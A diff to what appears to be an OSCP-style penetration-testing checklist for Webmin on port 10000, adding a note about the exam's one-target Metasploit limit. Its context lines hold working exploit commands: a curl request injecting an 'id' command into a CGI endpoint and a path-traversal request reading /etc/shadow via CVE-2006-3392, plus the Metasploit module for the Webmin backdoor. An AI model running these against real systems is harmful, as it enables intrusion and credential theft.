@@ -59,6 +59,7 @@ curl -sk --path-as-is -d 'echo Content-Type: text/plain; echo; id' '<Scheme>://<
 ## Webmin, on 10000
 - [ ] The web host filled in with Webmin's own port, 10000, usually over https
 - [ ] 1.890 to 1.920: the backdoor, CVE-2019-15107, with Metasploit's exploit/linux/http/webmin_backdoor
+- [ ] OSCP one-target limit: that Metasploit module spends my one target, even if it fails
 - [ ] Before 1.290: a file read with no login, CVE-2006-3392
 curl -sk '<Scheme>://<WebHost>/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow'
 
